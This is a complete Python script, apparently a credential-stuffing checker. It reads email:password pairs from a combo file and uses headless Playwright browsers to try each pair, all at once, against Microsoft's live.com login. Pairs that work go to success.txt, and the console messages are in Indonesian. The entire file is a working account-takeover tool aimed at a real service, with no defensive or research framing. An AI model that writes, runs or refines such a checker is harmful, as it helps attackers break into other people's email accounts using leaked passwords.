import asyncio
from playwright.async_api import async_playwright

SUCCESS_FILE = "success.txt"
FAILED_FILE = "failed.txt"

async def login_outlook(email, password, playwright):
    browser = await playwright.chromium.launch(headless=True)
    context = await browser.new_context()
    page = await context.new_page()

    try:
        await page.goto("https://login.live.com/")
        await page.fill('input[name="loginfmt"]', email)
        await page.click('input[type="submit"]')
        await page.wait_for_selector('input[name="passwd"]', timeout=8000)
        await page.fill('input[name="passwd"]', password)
        await page.click('input[type="submit"]')
        await page.wait_for_timeout(5000)

        content = await page.content()
        combo = f"{email}:{password}"

        if "Stay signed in?" in content or "Outlook" in content:
            print(f"[✅] LOGIN BERHASIL: {combo}")
            with open(SUCCESS_FILE, "a") as f:
                f.write(combo + "\n")
        else:
            print(f"[❌] GAGAL LOGIN: {combo}")
            with open(FAILED_FILE, "a") as f:
                f.write(combo + "\n")

    except Exception as e:
        print(f"[⚠️] ERROR {email}: {e}")
        with open(FAILED_FILE, "a") as f:
            f.write(f"{email}:{password}\n")
    finally:
        await browser.close()

async def main():
    with open("combo.txt") as f:
        combos = [line.strip() for line in f if ':' in line]

    open(SUCCESS_FILE, "w").close()
    open(FAILED_FILE, "w").close()

    async with async_playwright() as playwright:
        tasks = []
        for combo in combos:
            email, password = combo.split(":", 1)
            tasks.append(login_outlook(email, password, playwright))
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())